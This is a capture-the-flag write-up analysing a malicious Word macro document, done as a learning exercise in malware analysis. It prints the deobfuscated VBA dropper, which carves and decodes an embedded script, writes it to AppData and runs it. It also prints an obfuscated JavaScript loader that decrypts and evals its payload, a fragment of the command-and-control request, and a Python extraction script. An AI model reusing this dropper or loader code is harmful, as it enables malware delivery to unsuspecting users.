# Game Invitation Forensic Challenge Writeup

## Introduction

This challenge is all about analyzing malware .vba script inside .docm file.

## Solution

Firstly upon looking at a file as an archive (as all office files can be opened as such), I've stumbled upon vba script inside, which, of course, needs to be dug deeper. But there is no point of opening raw vbaProject.bin file, as it will give me just some binary data. For extraction of script I used https://github.com/decalage2/oletools a really amazing python package that helped me get this script in a raw form.

So, already deobfuscated script (base64 decoded and with vars renamed for the ease of reading) looks like this:

```vb

Attribute VB_Name = "NewMacros"
Public IAiiymixt As String
Public var_filepath As String


Function func_xor(given_string() As Byte, length As Long) As Boolean
Dim xor_key As Byte
xor_key = 45
For i = 0 To length - 1
given_string(i) = given_string(i) Xor xor_key
xor_key = ((xor_key Xor 99) Xor (i Mod 254))
Next i
func_xor = True
End Function

Sub AutoClose() 'delete the js script'
On Error Resume Next
Kill IAiiymixt
On Error Resume Next
Set var_scriptingfilesystemobject = CreateObject("Scripting.FileSystemObject")
var_scriptingfilesystemobject.DeleteFile var_filepath & "\*.*", True
Set var_scriptingfilesystemobject = Nothing
End Sub

Sub AutoOpen()
On Error GoTo jumper1
Dim chkDomain As String
Dim strUserDomain As String
chkDomain = "GAMEMASTERS.local"
strUserDomain = Environ$("UserDomain")
If chkDomain <> strUserDomain Then

Else

Dim var_file
Dim file_length As Long
Dim length As Long
file_length = FileLen(ActiveDocument.FullName)
var_file = FreeFile
Open (ActiveDocument.FullName) For Binary As #var_file
Dim var_byte1() As Byte
ReDim var_byte1(file_length)
Get #var_file, 1, var_byte1
Dim var_string As String
var_string = StrConv(var_byte1, vbUnicode)
Dim var_???1, var_matchedregex
Dim var_class
    Set var_class = CreateObject("vbscript.regexp")
    var_class.Pattern = "sWcDWp36x5oIe2hJGnRy1iC92AcdQgO8RLioVZWlhCKJXHRSqO450AiqLZyLFeXYilCtorg0p3RdaoPa"
    Set var_matchedregex = var_class.Execute(var_string)
Dim var_regexshenanigan
If var_matchedregex.Count = 0 Then
GoTo jumper1
End If
For Each var_???1 In var_matchedregex
var_regexshenanigan = var_???1.FirstIndex
Exit For
Next
Dim var_byte2() As Byte
Dim var_long As Long
var_long = 13082
ReDim var_byte2(var_long)
Get #var_file, var_regexshenanigan + 81, var_byte2
If Not func_xor(var_byte2(), var_long + 1) Then
GoTo jumper1
End If
var_filepath = "%appdata%\Microsoft\Windows"
Set var_scriptingfilesystemobject = CreateObject("Scripting.FileSystemObject")
If Not var_scriptingfilesystemobject.FolderExists(var_filepath) Then
var_filepath = "%appdata%"
End If
Set var_scriptingfilesystemobject = Nothing
Dim var_file2
var_file2 = FreeFile
IAiiymixt = var_filepath & "\mailform.js"
Open (IAiiymixt) For Binary As #var_file2
Put #var_file2, 1, var_byte2
Close #var_file2
Erase var_byte2
Set var_shellscript = CreateObject("WScript.Shell")
var_shellscript.Run """" + IAiiymixt + """ vF8rdgMHKBrvCoCp0ulm"
ActiveDocument.Save
Exit Sub
jumper1:
Close #var_file2
ActiveDocument.Save
End If
End Sub
```


After examining this script, I've concluded, that important bit (the actual mailform.js malware script) is hidden inside docm file after certain regex pattern, and then XORed couple of times. So, I wrote python script that will just replicate the steps:

```python
import re

def search_regex_in_docm(file_path, regex_pattern):
    with open(file_path, 'rb') as file:
        content = file.read()
        matches = re.finditer(regex_pattern, content)
        for match in matches:
            return(match.start())

def func_xor(given_string, length):
    xor_key = 45
    for i in range(length):
        given_string[i] = given_string[i] ^ xor_key
        xor_key = ((xor_key ^ 99) ^ (i % 254))
    return(given_string)


file_path = 'invitation.docm'
regex_pattern = b'sWcDWp36x5oIe2hJGnRy1iC92AcdQgO8RLioVZWlhCKJXHRSqO450AiqLZyLFeXYilCtorg0p3RdaoPa'

matchstart = search_regex_in_docm(file_path, regex_pattern)

with open(file_path, 'rb') as file:
    file.seek(matchstart + 80)
    match = file.read()

#print(match)
match = bytearray(match)

long = 13082
match = match[:long]

string = func_xor(match, long)

with open('mailform.js', 'wb') as file:
    file.write(string)
```

After that we got even deeper - this js file was not actually a malware, but rather obfuscated loader for such, here is the source:
(P.S. firstly the DASz var was pointing at Shell variables, but I just replaced it straight with the value)
```js

var DASz = "vF8rdgMHKBrvCoCp0ulm";
var Iwlh = lyEK();
Iwlh = JrvS(Iwlh);
Iwlh = xR68(DASz, Iwlh);
eval(Iwlh);
function af5Q(r) {
	var a = r.charCodeAt(0);
	if (a === 43 || a === 45)
		return 62;
	if (a === 47 || a === 95)
		return 63;
	if (a < 48)
		return -1;
	if (a < 48 + 10)
		return a - 48 + 26 + 26;
	if (a < 65 + 26)
		return a - 65;
	if (a < 97 + 26)
		return a - 97 + 26;
}
function JrvS(r) {
	var a = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
	var t;
	var l;
	var h;
	if (r.length % 4 > 0)
		return;
	var u = r.length;
	var g = r.charAt(u - 2) === '=' ? 2 : r.charAt(u - 1) === '=' ? 1 : 0;
	var n = new Array(r.length * 3 / 4 - g);
	var i = g > 0 ? r.length - 4 : r.length;
	var z = 0;
	function b(r) {
		n[z++] = r;
	}
	for (t = 0, l = 0; t < i; t += 4, l += 3) {
		h = af5Q(r.charAt(t)) << 18 | af5Q(r.charAt(t + 1)) << 12 | af5Q(r.charAt(t + 2)) << 6 | af5Q(r.charAt(t + 3));
		b((h & 16711680) >> 16);
		b((h & 65280) >> 8);
		b(h & 255);
	}
	if (g === 2) {
		h = af5Q(r.charAt(t)) << 2 | af5Q(r.charAt(t + 1)) >> 4;
		b(h & 255);
	} else if (g === 1) {
		h = af5Q(r.charAt(t)) << 10 | af5Q(r.charAt(t + 1)) << 4 | af5Q(r.charAt(t + 2)) >> 2;
		b(h >> 8 & 255);
		b(h & 255);
	}
	return n;
}
function xR68(r, a) {
	var t = [];
	var l = 0;
	var h;
	var u = '';
	for (var g = 0; g < 256; g++) {
		t[g] = g;
	}
	for (var g = 0; g < 256; g++) {
		l = (l + t[g] + r.charCodeAt(g % r.length)) % 256;
		h = t[g];
		t[g] = t[l];
		t[l] = h;
	}
	var g = 0;
	var l = 0;
	for (var n = 0; n < a.length; n++) {
		g = (g + 1) % 256;
		l = (l + t[g]) % 256;
		h = t[g];
		t[g] = t[l];
		t[l] = h;
		u += String.fromCharCode(a[n] ^ t[(t[g] + t[l]) % 256]);
	}
	return u;
}
function lyEK() {
	var r = 'cxbDXRuOhlNrpkxS7FWQ5G5jUC+Ria6llsmU8nPMP1NDC1Ueoj5ZEbmFzUbxtqM5UW2+nj/Ke2IDGJqT5CjjAofAfU3kWSeVgzHOI5nsEaf9BbHyN9VvrXTU3UVBQcyXOH9TrrEQHYHzZsq2htu+RnifJExdtHDhMYSBCuqyNcfq8+txpcyX/aKKAblyh6IL75+/rthbYi/Htv9JjAFbf5UZcOhvNntdNFbMl9nSSThI+3AqAmM1l98brRA0MwNd6rR2l4Igdw6TIF4HrkY/edWuE5IuLHcbSX1J4UrHs3OLjsvR01lAC7VJjIgE5K8imIH4dD+KDbm4P3Ozhrai7ckNw88mzPfjjeBXBUjmMvqvwAmxxRK9CLyp
    //Trust me there was a lot of encoded data, I don't want to put it here cause of readability
    +4M6U9FG9yxA10oQH1d7HIuM3M1EW0kPT+quYKtMS08BQLTTKZMtMkm0E=';
	return r;
}
```

So, if we replace here eval() with a printout, we will get...

A ZenBox malware (VirusTotal link: https://www.virustotal.com/gui/file/6168dd097c175f7c0088e5ff685db7054a5ca9e47425ef81f059b1f4b3069da6)
(Here we also can see which CVE this malware is abusing: https://nvd.nist.gov/vuln/detail/cve-2022-30190)

So, now we are "at the bottom" of that malware obfuscation chain, and can start inspecting this file. I won't provide the actual file, as there is no point of doing it as a different file, and if I paste it here it would take two too much space.

So, inside this file there was this HTTP query:

```javascript

S47T.OPEN('post', caA2, false);
S47T.SETREQUESTHEADER('user-agent:', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64); ' + he50());
S47T.SETREQUESTHEADER('content-type:', 'application/octet-stream');
S47T.SETREQUESTHEADER('content-length:', '4');
S47T.SETREQUESTHEADER('Cookie:', 'flag=SFRCe200bGQwY3NfNHIzX2czdHQxbmdfVHIxY2tpMTNyfQo=');
```

With our flag as a base64-ed cookie. So, after decoding we will get our flag:

HTB{m4ld0cs_4r3_g3tt1ng_Tr1cki13r}


Actually, it was really cool experience for me, as I never have done malware analysis of some sample, so this journey for me was really interesting. GGs!